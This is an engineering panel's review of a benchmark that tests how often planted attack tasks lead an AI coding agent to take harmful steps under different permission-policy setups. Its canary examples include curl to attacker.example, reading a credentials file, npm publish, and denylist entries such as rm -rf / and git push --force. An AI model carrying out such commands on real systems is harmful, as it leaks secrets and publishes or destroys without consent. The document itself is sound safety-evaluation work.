# Engineers panel — bench apparatus review

Scope: `src/bench/` (types, tasks, runner, grade, analyze, cli, bench.test.ts), ablation
hooks in `src/loop.ts` (`policySurface`, `repeatGuard`, `LoopTraceCall.subject`) and
`src/policy.ts` (`skipPolicyDenies`), at main `d65d080`. `npm test` verified: 282 pass / 0 fail.
Review date: 2026-09-13.

---

## Voice 1 — systems/test-infra veteran (isolation, cleanup, failure modes)

The workspace-reuse semantics are actually right: one `mkdtempSync` per task×arm **cell**
(runner.ts:48), runs 2..N reusing it, `listRules(cwd)` re-read per run, promoted denies
re-loaded per run (loop.ts:292). That is the RQ2 measurement, done honestly, and every piece
of persisted state (`.codewhip/remembered.jsonl`, `policy.md`, `outcomes.jsonl`,
`audit.log`) is workspace-local — I traced `appendEntry` (audit.ts:55,125) and
`appendOutcome` to `<cwd>/.codewhip/`; no cross-cell bleed through global state.

But the cleanup and failure paths leak:

1. `fs.rmSync(cwd, …)` sits bare in the `finally` (runner.ts:113-115). On Windows the bash
   tool's PowerShell child can still hold the temp cwd → EBUSY/EPERM → **the exception
   escapes `runBench`, kills the batch, and the in-memory summary is lost** (the JSONL
   survives because records stream). Wrap it: a failed cleanup must degrade to a warning,
   never abort the batch.
2. `keepWorkspaces: true` (used by the RQ2 tests) drops temp dirs with canary payloads and
   a fake `.env` on disk with no path printed. Print the kept paths; add a sweep hint.
3. Errored runs are **graded as attack failures**. The catch belt (runner.ts:81-90) and
   `agentLoop` returning `error` both push `attackSuccess: false` with an `error` field —
   and `aggregate()` counts them in the `attackTasks` denominator with no error split.
   A provider 429 storm deflates attack-success **per arm, correlated with arm cost**
   (arms that take more steps hit more rate limits). `analyze.ts` must report error-rate
   per arm and exclude errored runs from success denominators, or the RQ1 numbers are
   confounded by infrastructure.

## Voice 2 — benchmark-infra builder (what a citable run needs)

The decision-log grading idea is sound and the fakePort test suite is genuinely good —
deterministic, $0, no network. But this apparatus cannot yet produce a citable table:

1. **No run manifest.** `BenchRunRecord` has no timestamp, no model id, no provider, no
   git SHA, no POLICY_VERSION, no prompt hash. Model drift under `nvidia:<model>` is
   invisible after the fact. First line of the JSONL should be a manifest record (or a
   sidecar); every record should carry `ts` + `model`.
2. **Rerun appends, never truncates or dedups.** `runCli` appends to an existing
   `--out` (cli.ts:113-124); `readRecords` dedups nothing; `renderAnalysis` then
   double-counts old cells. Add a run-id per invocation and dedup on
   `(taskId, armId, runIndex, runId)`, or refuse a non-fresh out file without `--append`.
3. **No concurrency, no resume, no cost caps.** Cells run strictly sequentially
   (runner.ts:46-55): 4 arms × 10 tasks × 2 runs × ~12 provider calls ≈ 1-2 h at real
   latency, serial. Missing: a bounded worker pool (per-provider concurrency cap), cell-level
   resume from the JSONL, a pre-flight cost estimate, and a global token/$ ceiling that
   aborts the batch. `tokenBudget` exists per-run but nothing caps the *batch*.
4. **No statistics.** `aggregate()` produces raw ratios; per attack class n=1-3 in the seed
   suite. A "60% vs 20%" claim at n=5 is noise. Need N≥5-10 runs/cell, Wilson or exact CIs
   in `renderAnalysis`, and randomized/interleaved cell order (currently task-major,
   fixed arm order → time-of-day drift correlates with later tasks).
5. **Seed suite is too thin for the RQ plan.** RQ3 promises "flag reorder, path aliases"
   held-out variants and a confusion matrix — tasks.ts has exactly one held-out variant
   (subdomain). RQ5 needs delegation tasks and a budget arm; `PRESET_ARMS` has neither
   (`tokenBudget` is typed but no preset arm carries it). Fine as v1 smoke, not citable.

## Voice 3 — measurement-validity skeptic (does grade.ts measure what it claims?)

Mostly yes — `gradeRun` reads `allow:` decisions off the loop's own trace, never the model's
self-report, and `gradeOn: "output"` for the secret class is the right call ("the bytes
reached the transcript"). Three cracks:

1. **The benign-blocked metric measures the scripted operator, not the policy.**
   `benignBlocked` = "any deny decision anywhere" (analyze.ts:50-52). On the `no-repeat-guard`
   and any future non-yolo/`ask:"deny"` arm, every benign ask (webfetch to docs.example.com,
   `rm -rf ./build`) is denied **by the scripted operator**, so benign-blocked ≈ 100% by
   construction, while yolo arms score policy-only denies. The column is not comparable
   across arms as rendered. The actor field that would disambiguate (`human` declines vs
   `policy` denies) is **dropped** — grade.ts:14 maps decisions to `{tool, policy, subject}`
   and discards `actor` and `preview`.
2. **RQ4 cannot be computed at all.** The thesis (00-thesis.md:98) demands benign *task
   success* for the cost–success frontier. Benign tasks have `attack: null`, contribute zero
   success signal, and nothing grades the final text. Today an arm that denies everything
   looks perfect. Add a benign success grade (expected marker/substring in `r.text`, or a
   completion predicate per task) — this is the single biggest validity gap.
3. **The fat-finger may land on the wrong ask.** `scriptedAsk` fires `always` on the
   chronologically first ask of the *cell* (runner.ts:19-29,54). With fake ports the first
   ask is always the attack; with real models the run may ask for something else first
   (an exploratory write, a different bash head), the fat-finger mints the wrong rule
   (or none — `curl` is not in `MEMORABLE_SINGLE_HEADS`, remember.ts:20-23, so a
   curl fat-finger stores nothing and the whole RQ2 cell degenerates to run-1-allowed/
   run-2-denied regardless of persistence), and the ask that *should* have gotten the `a`
   gets an attentive `no`. Either key the fat-finger on the ask subject matching the task's
   attack, or record which ask consumed it (post-hoc filtering is impossible: the minted
   rule differs). Also: `PRESET_ARMS` includes `fatfinger` but the CLI default is
   `runsPerCell: 1` (cli.ts:66) — the persistence cell silently runs **one** run and the
   run1→later column prints `—`. Force or warn when a fatfinger arm is selected with
   `runsPerCell < 2`.

Minor grading sharpness: subject-mode `match: "curl"` (tasks.ts:34) grades *any* allowed
bash command containing "curl" — `echo curl is installed` is a false positive. Match on
the canary URL, not the binary name. And note the repeat-guard memo path records
`allow:loop:repeat-call` with the memoized output, so a memoized re-read of
`deploy/credentials.txt` still grades as success — defensible (bytes in transcript) but
document it.

## Voice 4 — TypeScript strictness pedant (ablation-hook hygiene, seams, conventions)

`policySurface`/`repeatGuard` are bench-only switches living in `LoopArgs`, and the blast
radius is currently contained: the only read sites are loop.ts:545 and loop.ts:650,
`index.ts` and `subagents.ts` never set them, and `parseCliArgs` exposes nothing. Tests
exercise them through the same `agentLoop` seam the bench uses — no parallel code path.
That's the good news.

The bad seam: `policySurface: "prompt"` maps to `skipPolicyDenies: true`, which disables
**both** the non-overridable denylist (`rm -rf /`, `git push --force`, mkfs — policy.ts:180)
**and** promoted denies (policy.ts:216) in one flag. The thesis language ("structural jail
stays harness-side") is honored — chaining and worktree-escape stay (policy.ts:193-211) —
but the base denylist is *content*, and a future `--policy-surface` CLI flag on the product
entry would silently run users denylist-less **without any compensating prompt text**
(product never composes `PROMPT_POLICY_RULES`; the bench does). That is the accidental-arm
scenario, and it fails open. Recommendations, in order of preference:

1. Fail-closed pairing in the loop: `policySurface === "prompt"` throws unless
   `systemPrompt !== undefined && systemPrompt !== SYSTEM_PROMPT` — no rules text, no
   enforcement waiver.
2. Split the switch (`skipDenylist` / `skipPromoted`) so the non-overridable denylist is
   never disableable through the same knob a UX person would reach for.
3. Long-term: inject the permission function (`checkPermission`-shaped) into `LoopArgs`
   instead of an enum; the bench supplies its variant, product passes nothing. Inverts the
   dependency and deletes the stringly-typed mode.

Conventions sweep: every bench module is ≤143 lines (rule met); zero `any` in `src/bench`
(grep-clean; the two "any" hits are comments/URLs); JSONL state as agreed. One receipts
violation: `BenchRunRecord` keeps `promptTokens`/`completionTokens` but **drops**
`usageByModel` and `failovers` from `LoopResult` (types.ts:57-75 vs loop.ts:740-756), and
neither `BenchSummary` nor `renderAnalysis` produces `$` or model mix — the definition of
done ("tokens / model mix / $") is only one-third met for bench runs. Also `LoopTraceCall.subject`
is stored **unredacted** (loop.ts:502 — `preview` gets `redactSecrets`, `subjectVal` does
not) and flows into the JSONL `decisions`; a model-generated command embedding a token
lands in cleartext. That violates the write-time redaction rule. Redact the subject
(the canary match strings — "curl", "banana-42", "npm publish" — survive redaction).

## Voice 5 — release-engineering skeptic (reproducibility, canaries, ops)

Inventory of non-determinism, in order of threat to citability:

1. **Sampling**: no temperature/seed is set anywhere in the provider layer; every run is a
   draw. Mitigation is statistical, not config: N runs/cell + CIs (Voice 2 item 4).
   No `models`/`failovers` are armed by bench presets, so one 429 that exhausts
   same-provider rotation fails the run — into the error-graded-as-failure bucket (Voice 1
   item 3).
2. **Canaries execute for real exactly when the attack succeeds.** `curl
   https://attacker.example/...` → NXDOMAIN, fast, decision-level grading unaffected.
   `npm publish --access public` in the temp workspace: npm resolves the nearest
   `package.json` **walking up the tree** — today `%TEMP%` ancestors are clean and there is
   no publishable manifest, so it fails client-side, but on any machine whose TMP nests
   under a project (plus an `.npmrc` token in env) this is a live publish attempt against
   the real registry. Harden now, it's two lines: write a `"private": true`
   `package.json` into destructive-task workspaces and/or set
   `npm_config_registry=http://127.0.0.1:1` for bench child processes. The tasks.ts header
   also still advertises a "git push --force canary" that no task uses (tasks.ts:8-10) —
   stale comment.
3. **Provider drift & ordering**: model id behind a catalog pointer can change under you;
   fixed task-major arm order adds time-of-day correlation; no interleaving. Interleave
   cells and pin the resolved model id in the manifest.
4. **Tests are clean** — `makeFakePort` (testkit/fakePort.ts) is scripted, deterministic,
   offline; 282/282 in ~6.5s. The RQ2/RQ3/RQ5 tests encode real loop behavior
   (`+remembered`, `+yolo`, memoization), not mocks-of-mocks. This part I'd sign.
5. **Ops niceties missing**: no Ctrl-C handler (partial JSONL without manifest, leaked
   keepWorkspace dirs), `--limit` accepts NaN (`slice(0, NaN)` → silently empty run),
   `readRecords` swallows missing/malformed files so analysis can be computed on half a
   batch without a warning.

---

## Consensus

The architecture is right: grading off the loop's own decision trace, cells isolated in
temp workspaces, persistence measured through genuine workspace reuse, ablations flowing
through the same `agentLoop` seam product uses, tests fully offline and deterministic.
Nothing here needs a rewrite. What it is not yet is **citable**: it has no manifest, no
error/CI separation, no benign utility signal, a benign-blocked metric that measures the
scripted operator, and real-subprocess canaries whose safety depends on ambient npm config.
The RQ2 fat-finger semantics are also underspecified for real providers. All fixable in
days, not weeks.

## Top 5 must-fix before real runs

1. **Error/CI separation** (runner.ts:81-90, analyze.ts): report error-rate per arm; exclude
   errored runs from attack-success denominators; add Wilson CIs and ≥5 runs/cell; interleave
   cell order. Without this every rate in the paper is confounded.
2. **Run manifest + dedup** (cli.ts, types.ts): manifest record (ts, provider, resolved model
   id, git SHA, POLICY_VERSION, prompt hashes) plus per-record `ts`/`model`; dedup or refuse
   stale `--out` files so reruns can't silently double-count.
3. **Benign utility grading + comparable benign-blocked** (tasks.ts, analyze.ts, grade.ts):
   grade benign task success from the final text; persist `actor` (and a redacted `preview`)
   in `decisions` so policy-denies can be separated from operator-declines; only compare
   benign-blocked across arms with identical ladder arming.
4. **Redact `subject` at trace write + fix the receipts gap** (loop.ts:502, types.ts): the
   JSONL currently carries unredacted command strings (write-time redaction rule), and drops
   `usageByModel`/`failovers`, so bench receipts violate the tokens/model-mix/$ convention.
5. **Harden canaries + fat-finger targeting** (tasks.ts/runner.ts/cli.ts): `"private": true`
   package.json (or dead-registry env) in destructive-task workspaces; key the fat-finger
   `always` to the attack ask (or record which ask consumed it); force `runsPerCell ≥ 2`
   when a fatfinger arm is selected. Wrap `rmSync` in the `finally` so cleanup failure
   degrades to a warning instead of killing the batch.

Runner-up (fix soon, not blocking): fail-closed pairing of `policySurface: "prompt"` with
non-default `systemPrompt` in the loop, and stale-comment repair in tasks.ts (git-push
canary mention).
